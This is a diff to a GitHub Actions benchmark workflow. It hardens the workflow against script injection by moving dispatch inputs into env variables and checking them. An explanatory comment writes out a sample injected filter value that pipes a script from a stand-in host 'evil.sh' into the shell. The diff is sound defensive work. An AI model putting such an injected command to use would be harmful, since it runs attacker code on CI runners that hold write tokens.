@@ -63,11 +63,24 @@ jobs:
             10.0.x
 
       # A "short" job keeps CI fast; trends (not absolute numbers) are what matter on shared runners.
+      #
+      # Every dispatch input reaches the shell through `env:`, never through `${{ }}` inside `run:`.
+      # GitHub substitutes expressions BEFORE the shell parses the script, so an interpolated input
+      # is not an argument — it is source. A filter of `x" ; curl evil.sh | sh ; echo "` would have
+      # run as its own command, on a runner whose token carries `contents: write`. Quoted `$VAR`
+      # expansion happens after parsing and cannot introduce syntax.
       - name: Run BenchmarkDotNet
+        env:
+          BENCHMARK_FILTER: ${{ github.event.inputs.benchmark_filter || '*' }}
+          BENCHMARK_JOB: ${{ github.event.inputs.benchmark_job || 'short' }}
         run: |
+          case "$BENCHMARK_JOB" in
+            default|dry|short|medium|long|verylong) ;;
+            *) echo "::error::benchmark_job must be one of: default, dry, short, medium, long, verylong."; exit 1 ;;
+          esac
           dotnet run -c Release --project benchmarks/AsyncResponse.Benchmarks -- \
-            --filter "${{ github.event.inputs.benchmark_filter || '*' }}" \
-            --job "${{ github.event.inputs.benchmark_job || 'short' }}"
+            --filter "$BENCHMARK_FILTER" \
+            --job "$BENCHMARK_JOB"
 
       # BenchmarkSwitcher writes one report per benchmark class; merge their Benchmarks arrays into the
       # single file github-action-benchmark expects.
@@ -96,15 +109,28 @@ jobs:
       # Asserts correctness under load (process exits non-zero on a violation, failing the job) and
       # writes throughput/latency/allocation series for charting.
       - name: Run stress harness
+        env:
+          STRESS_CONCURRENCY: ${{ github.event.inputs.stress_concurrency || '256' }}
+          STRESS_COUNT: ${{ github.event.inputs.stress_count || '25000' }}
+          STRESS_FANOUT: ${{ github.event.inputs.stress_fanout || '4' }}
+          STRESS_TIMEOUT_COUNT: ${{ github.event.inputs.stress_timeout_count || '2000' }}
+          STRESS_TIMEOUT_MS: ${{ github.event.inputs.stress_timeout_ms || '50' }}
         run: |
+          # Every stress knob is numeric; reject anything else outright rather than passing it on.
+          for var in STRESS_CONCURRENCY STRESS_COUNT STRESS_FANOUT STRESS_TIMEOUT_COUNT STRESS_TIMEOUT_MS; do
+            value="${!var}"
+            case "$value" in
+              ''|*[!0-9]*) echo "::error::$var must be a non-negative integer (got '$value')."; exit 1 ;;
+            esac
+          done
           dotnet run -c Release --project benchmarks/AsyncResponse.Benchmarks -- \
             stress \
-            --concurrency "${{ github.event.inputs.stress_concurrency || '256' }}" \
-            --count "${{ github.event.inputs.stress_count || '25000' }}" \
+            --concurrency "$STRESS_CONCURRENCY" \
+            --count "$STRESS_COUNT" \
             --progress 5 \
-            --fanout "${{ github.event.inputs.stress_fanout || '4' }}" \
-            --timeout-count "${{ github.event.inputs.stress_timeout_count || '2000' }}" \
-            --timeout-ms "${{ github.event.inputs.stress_timeout_ms || '50' }}" \
+            --fanout "$STRESS_FANOUT" \
+            --timeout-count "$STRESS_TIMEOUT_COUNT" \
+            --timeout-ms "$STRESS_TIMEOUT_MS" \
             --json "${{ github.workspace }}/stress"
 
       - name: Publish stress throughput (bigger is better)
